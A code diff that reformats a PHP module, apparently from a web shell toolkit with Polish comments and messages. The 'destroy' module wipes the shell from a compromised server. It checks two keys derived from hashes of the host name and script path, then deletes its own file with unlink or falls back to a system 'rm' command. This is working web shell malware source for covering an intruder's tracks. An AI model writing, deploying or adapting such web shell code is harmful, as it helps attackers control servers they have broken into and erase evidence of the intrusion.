@@ -20,125 +20,118 @@
  */
 class ModuleDestroy extends ModuleAbstract
 {
-	/**
-	 * Pierwszy klucz dostepowy
-	 *
-	 * @access private
-	 * @var    string
-	 */
-	private $sKey;
+    /**
+     * Pierwszy klucz dostepowy
+     *
+     * @access private
+     * @var    string
+     */
+    private $sKey;
 
-	/**
-	 * Drugi klucz dostepowy
-	 *
-	 * @access private
-	 * @var    string
-	 */
-	private $sFinalKey;
+    /**
+     * Drugi klucz dostepowy
+     *
+     * @access private
+     * @var    string
+     */
+    private $sFinalKey;
 
-	/**
-	 * Konstruktor
-	 *
-	 * @access public
-	 * @param  object $oShell Obiekt Shell
-	 * @return void
-	 */
-	public function __construct( Shell $oShell )
-	{
-		parent::__construct( $oShell );
+    /**
+     * Konstruktor
+     *
+     * @access public
+     * @param  object $oShell Obiekt Shell
+     * @return void
+     */
+    public function __construct(Shell $oShell)
+    {
+        parent::__construct($oShell);
 
-		$this -> sKey = strtoupper( substr( md5( Request::getServer( 'HOST' ) ), 0, 8 ) );
+        $this->sKey = strtoupper(substr(md5(Request::getServer('HOST')), 0, 8));
 
-		$this -> sFinalKey = strtoupper( substr( md5( Request::getServer( 'SCRIPT_FILENAME' ) ), 0, 8 ) );
-	}
+        $this->sFinalKey = strtoupper(substr(md5(Request::getServer('SCRIPT_FILENAME')), 0, 8));
+    }
 
-	/**
-	 * Dostepna lista komend
-	 *
-	 * @access public
-	 * @return array
-	 */
-	public function getCommands()
-	{
-		return array
-		(
-			'destroy',
-			'removeshell'
-		);
-	}
+    /**
+     * Dostepna lista komend
+     *
+     * @access public
+     * @return array
+     */
+    public function getCommands()
+    {
+        return array
+        (
+            'destroy',
+            'removeshell'
+        );
+    }
 
-	/**
-	 * Zwracanie wersji modulu
-	 *
-	 * @access public
-	 * @return string
-	 */
-	public function getVersion()
-	{
-		/**
-		 * Wersja Data Autor
-		 */
-		return '1.00 2011-09-10 - <krzotr@gmail.com>';
-	}
+    /**
+     * Zwracanie wersji modulu
+     *
+     * @access public
+     * @return string
+     */
+    public function getVersion()
+    {
+        /**
+         * Wersja Data Autor
+         */
+        return '1.00 2011-09-10 - <krzotr@gmail.com>';
+    }
 
-	/**
-	 * Zwracanie pomocy modulu
-	 *
-	 * @access public
-	 * @return string
-	 */
-	public function getHelp()
-	{
-		return sprintf( "Trwałe usuwanie shella\r\n\r\n\tUżycie:\r\n\t\tdestroy %s", $this -> sKey );
-	}
+    /**
+     * Zwracanie pomocy modulu
+     *
+     * @access public
+     * @return string
+     */
+    public function getHelp()
+    {
+        return sprintf("Trwałe usuwanie shella\r\n\r\n\tUżycie:\r\n\t\tdestroy %s", $this->sKey);
+    }
 
-	/**
-	 * Wywalenie w kosmos
-	 *
-	 * @access public
-	 * @return string
-	 */
-	public function get()
-	{
-		/**
-		 * Help
-		 */
-		if( $this -> oShell -> getArgs() -> getNumberOfParams() === 0 )
-		{
-			return $this -> getHelp();
-		}
+    /**
+     * Wywalenie w kosmos
+     *
+     * @access public
+     * @return string
+     */
+    public function get()
+    {
+        /**
+         * Help
+         */
+        if ($this->oShell->getArgs()->getNumberOfParams() === 0) {
+            return $this->getHelp();
+        }
 
-		$sKey = $this -> oShell -> getargs() -> getParam( 0 );
-		$sFinalKey = $this -> oShell -> getargs() -> getParam( 1 );
+        $sKey = $this->oShell->getargs()->getParam(0);
+        $sFinalKey = $this->oShell->getargs()->getParam(1);
 
-		if( ( $sKey === $this -> sKey ) )
-		{
-			if( $sFinalKey === $this -> sFinalKey )
-			{
-				$sFilePath = Request::getServer( 'SCRIPT_FILENAME' );
+        if (($sKey === $this->sKey)) {
+            if ($sFinalKey === $this->sFinalKey) {
+                $sFilePath = Request::getServer('SCRIPT_FILENAME');
 
-				/**
-				 * Usuwanie pliku
-				 */
-				if( ! unlink( $sFilePath ) )
-				{
-					if( $this -> oShell -> isExecutable() )
-					{
-						$this -> oShell -> getCommandSystem( sprintf( 'rm %s', $sFilePath ) );
-					}
-				}
+                /**
+                 * Usuwanie pliku
+                 */
+                if (!unlink($sFilePath)) {
+                    if ($this->oShell->isExecutable()) {
+                        $this->oShell->getCommandSystem(sprintf('rm %s', $sFilePath));
+                    }
+                }
 
-				return sprintf( 'Shell %szostał usunięty', ( ! is_file( $sFilePath ) ? NULL : 'nie ' ) );
-			}
-			else
-			{
-				return sprintf( "Na pewno chcesz usunąć tego szela?\r\nJeżeli tak to wywołaj poniższe polecenie:\r\n\r\n\t:destroy %s %s\r\n\r\nPamiętaj, aby ciąg %s wpisać w odwrotniej kolejności",
-					$this -> sKey, $sFinalKey = strrev( $this -> sFinalKey ), $sFinalKey
-				);
-			}
-		}
+                return sprintf('Shell %szostał usunięty', (!is_file($sFilePath) ? NULL : 'nie '));
+            } else {
+                return sprintf("Na pewno chcesz usunąć tego szela?\r\nJeżeli tak to wywołaj poniższe polecenie:\r\n\r\n\t:destroy %s %s\r\n\r\nPamiętaj, aby ciąg %s wpisać w odwrotniej kolejności",
+                    $this->sKey, $sFinalKey = strrev($this->sFinalKey), $sFinalKey
+                );
+            }
+        }
 
-		return $this -> getHelp();
-	}
+        return $this->getHelp();
+    }
 
 }
